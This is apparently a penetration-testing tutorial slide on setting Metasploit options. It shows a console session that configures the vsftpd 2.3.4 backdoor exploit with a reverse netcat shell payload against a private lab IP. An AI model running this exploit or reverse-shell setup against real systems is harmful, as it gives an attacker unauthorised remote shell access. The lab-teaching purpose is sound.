Configuring Exploit Options

Tailoring the exploit to your target environment

1. Displaying Options

The `show options` command reveals all required and optional parameters for the selected exploit. This is crucial for understanding what needs to be configured.

  • Identifies `RHOSTS`, `LHOST`, `RPORT`, etc.
  • Highlights mandatory settings.

2. Setting Parameters

Use `set ` to configure specific parameters. `RHOSTS` is the target IP, and `LHOST` is your attacking machine's IP.

  • Example: `set RHOSTS 192.168.1.105`
  • Example: `set LHOST 192.168.1.100` (your Kali IP)
Key Takeaway

Incorrect `RHOSTS` or `LHOST` values are common causes of failed exploits. Always verify your network configuration.

msfconsole exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier
   RPORT   21               yes       The target port (TCP)

Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (a.k.a. the local host)
   LPORT  4444             yes       The listen port (a.k.a. the local port)

msfconsole exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.105
RHOSTS => 192.168.1.105
msfconsole exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.1.100
LHOST => 192.168.1.100
